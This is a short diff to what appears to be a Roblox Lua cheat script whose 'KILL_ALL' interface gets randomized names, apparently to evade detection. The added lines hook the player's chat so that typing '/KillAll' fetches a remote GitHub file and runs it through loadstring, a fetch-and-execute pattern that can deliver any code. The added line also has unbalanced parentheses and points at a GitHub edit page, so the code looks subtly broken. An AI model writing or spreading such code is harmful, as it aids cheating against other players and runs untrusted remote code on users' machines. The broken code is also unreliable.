@@ -257,4 +257,10 @@ local function IRMPG_fake_script()
 	game.CoreGui["KILL_ALL_sL2"].Name = generateSecureString(32);
 	game.CoreGui["KILL_ALL_sL2"].Handler.Name = generateSecureString(32);
 end
-coroutine.wrap(IRMPG_fake_script)()
+coroutine.wrap(IRMPG_fake_script)();
+
+game.Players.LocalPlayer.Chatted:Connect(function(Chat)
+     if Chat == "/KillAll" then
+	  loadstring(HttpGet("https://github.com/skidthekid/database/edit/main/SETTINGS.lua")() 	
+  end
+end)
